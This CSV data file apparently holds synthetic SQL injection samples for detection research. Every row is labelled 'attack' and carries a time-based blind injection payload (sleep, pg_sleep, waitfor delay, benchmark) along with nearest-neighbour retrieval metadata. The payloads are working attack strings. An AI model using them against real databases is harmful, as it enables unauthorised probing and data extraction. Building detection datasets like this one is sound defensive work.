id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001623,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,6.201270276267176
CTGAN_001624,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.691196951166536
CTGAN_001625,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.500680001524599
CTGAN_001626,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,7.082898072423297
CTGAN_001627,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,7.95555047626759
CTGAN_001628,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,7.293918518761135
CTGAN_001629,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,7.466234894045983
CTGAN_001630,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,7.513022423665106
CTGAN_001631,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,8.455645763840511
CTGAN_001632,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.634217559906565
CTGAN_001633,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,6.284322687566628
CTGAN_001634,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,7.755040689048301
CTGAN_001635,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,6.325537481501242
CTGAN_001636,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.797042002259379
CTGAN_001637,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,5.597562697499026
CTGAN_001638,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,5.0619312853156515
CTGAN_001639,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,6.2887703319912
CTGAN_001640,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,5.267573387501393
CTGAN_001641,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.909724992585184
CTGAN_001642,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,6.765750589952282
CTGAN_001643,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,7.325684384232791
CTGAN_001644,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.781047975085988
CTGAN_001645,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,6.805512845437613
CTGAN_001646,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,6.690636824123626
CTGAN_001647,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,5.29825171774822
CTGAN_001648,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,8.258210511964206
CTGAN_001649,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,7.227779561853198
CTGAN_001650,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,8.171219458489047
CTGAN_001651,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.722187296741449
CTGAN_001652,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,7.074281140451341
CTGAN_001653,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.5115085813530085
CTGAN_001654,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,6.997393371047132
CTGAN_001655,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,5.41225852153287
CTGAN_001656,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,8.558482561326121
CTGAN_001657,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.088025507581331
CTGAN_001658,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,7.077762560978859
CTGAN_001659,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,5.373148377469523
CTGAN_001660,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,8.767882144217683
CTGAN_001661,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,6.067354259866148
CTGAN_001662,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,6.605077510073284
CTGAN_001663,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,5.811899890747059
CTGAN_001664,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,7.0822020898780975
CTGAN_001665,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.401791356441297
CTGAN_001666,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000051,8.963158246362742
CTGAN_001667,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,7.184760257688015
CTGAN_001668,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,7.312138303270539
CTGAN_001669,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000011,6.403943586993816
CTGAN_001670,attack,time,select pg_sleep  (  5  )   and    (    (   'rnzp'  =  'rnzp,nearest_attack_euclidean,R000057,5.324324614389451
CTGAN_001671,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,7.16368918456913
CTGAN_001672,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,6.032920377378973
CTGAN_001673,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,8.332865686398677
CTGAN_001674,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,8.198149737247283
CTGAN_001675,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.70971612054698
CTGAN_001676,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,7.1905505688298
CTGAN_001677,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,5.9572853276645
CTGAN_001678,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,9.120387633853575
CTGAN_001679,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,5.904067752127911
CTGAN_001680,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,8.406757046858619
CTGAN_001681,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,8.700110175194212
CTGAN_001682,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,7.1442836165203065
CTGAN_001683,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,6.300121563564174
CTGAN_001684,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.856205408859678
CTGAN_001685,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,7.878725551006527
CTGAN_001686,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000059,6.481549568234243
CTGAN_001687,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,5.539820937520071
CTGAN_001688,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000017,8.567470783397196
CTGAN_001689,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.1985424699062
CTGAN_001690,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000036,7.592709413740696
CTGAN_001691,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,3.63212599019088
CTGAN_001692,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,6.5746892064692855
CTGAN_001693,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,6.4607766883641915
CTGAN_001694,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,7.580211310301221
CTGAN_001695,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,8.354649591191103
CTGAN_001696,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,7.762981525549497
CTGAN_001697,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,7.602210879512047
CTGAN_001698,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,7.11397551352285
CTGAN_001699,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000012,6.557906021482547
CTGAN_001700,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000069,7.564350851559204
CTGAN_001701,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000008,6.816466523981597
CTGAN_001702,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000071,7.662095901512054
CTGAN_001703,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,5.852887620469854
CTGAN_001704,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,7.174404621497635
CTGAN_001705,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,7.304654527149686
CTGAN_001706,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,6.025305116278721
CTGAN_001707,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,7.5971733704526905
CTGAN_001708,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,5.832393791960106
CTGAN_001709,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,8.06910547049352
CTGAN_001710,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,7.8776320844208
CTGAN_001711,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,7.4399737269410435
CTGAN_001712,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,6.7105515129092375
CTGAN_001713,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,7.556638568752358
CTGAN_001714,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,5.996426078694498
CTGAN_001715,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,7.1912363898782266
CTGAN_001716,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000037,6.9005747179377614
CTGAN_001717,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,7.763056547805697
CTGAN_001718,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,7.829366517854877
CTGAN_001719,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,6.081372631387263
CTGAN_001720,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,8.809171706864035
CTGAN_001721,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,7.123714961761977
CTGAN_001722,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,8.018249975968907
CTGAN_001723,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,8.770322189175975
CTGAN_001724,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,7.792726060270846
CTGAN_001725,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000032,7.674782953084388
CTGAN_001726,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,7.448360289484409
CTGAN_001727,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,7.068848842694962
CTGAN_001728,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,7.192128176778217
CTGAN_001729,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,7.052687061397464
CTGAN_001730,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,7.655934852539983
CTGAN_001731,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000056,6.331906481851979
CTGAN_001732,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,6.968860201630711
CTGAN_001733,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,6.5881227475067625
CTGAN_001734,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,6.9913187513666095
CTGAN_001735,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000002,7.0107704739804895
CTGAN_001736,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,6.8934046716843
CTGAN_001737,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000026,7.027188433294224
CTGAN_001738,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.6918669312427905
CTGAN_001739,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,5.850523768528809
CTGAN_001740,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000028,6.537659314674715
CTGAN_001741,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,5.944846770914705
CTGAN_001742,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,7.687444504943889
CTGAN_001743,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,7.216983401541427
CTGAN_001744,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,7.307069712756483
CTGAN_001745,attack,time,1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #,nearest_attack_euclidean,R000064,7.142474020139065
CTGAN_001746,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000073,8.141129522847981
CTGAN_001747,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.240981333758351
CTGAN_001748,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000069,8.018827381269976
CTGAN_001749,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000024,5.6364377970585835
CTGAN_001750,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.622737902382033
CTGAN_001751,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,6.834097912681648
CTGAN_001752,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.832304945917049
CTGAN_001753,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000020,6.28450272520871
CTGAN_001754,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,7.5919665815097
CTGAN_001755,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000003,7.841384889749852
CTGAN_001756,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000029,5.908956314395663
CTGAN_001757,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000010,7.8698444058994035
CTGAN_001758,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000045,6.115099032069229
CTGAN_001759,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,7.658721614553346
CTGAN_001760,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000063,8.010686143004095
CTGAN_001761,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,8.133624375562409
CTGAN_001762,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,7.697378933340415
CTGAN_001763,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,7.307562197621411
CTGAN_001764,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000069,8.316452790170977
CTGAN_001765,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000018,6.017693368260345
CTGAN_001766,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,6.9129904122585675
CTGAN_001767,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,6.341760964716126
CTGAN_001768,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,8.186549241468231
CTGAN_001769,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,7.721445880971906
CTGAN_001770,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,7.099525370133008
CTGAN_001771,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,8.725017150017312
CTGAN_001772,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,6.990469584125201
CTGAN_001773,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000058,7.155135165927541
CTGAN_001774,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,5.992451723270162
CTGAN_001775,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000015,7.829725138418385
CTGAN_001776,attack,time,1 where 1568  =  1568 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000054,6.959908258219923
CTGAN_001777,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000069,9.157795268035281
CTGAN_001778,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,7.904209354055016
CTGAN_001779,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,6.65892642738697
CTGAN_001780,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,7.430170296287131
CTGAN_001781,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000046,7.460728591610943
CTGAN_001782,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000061,7.302110708669543
CTGAN_001783,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000006,7.758008935976497
CTGAN_001784,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,6.182209061949379
CTGAN_001785,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,7.520068397731444
CTGAN_001786,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000009,6.168020632237721
CTGAN_001787,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,6.168861778808257
CTGAN_001788,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,8.448934526907356
CTGAN_001789,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,7.142996117351847
CTGAN_001790,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000047,6.295125810912598
CTGAN_001791,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp",nearest_attack_euclidean,R000078,6.456491994024113
CTGAN_001792,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,6.942498673393119
CTGAN_001793,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,7.281072803878392
CTGAN_001794,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,7.290921840071566
CTGAN_001795,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,7.193816892515425
CTGAN_001796,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000035,5.305607920418804
CTGAN_001797,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,7.429086718021372
CTGAN_001798,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000025,8.461139215224437
CTGAN_001799,attack,time,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pbin'  =  'pbin",nearest_attack_euclidean,R000027,7.337070338412273
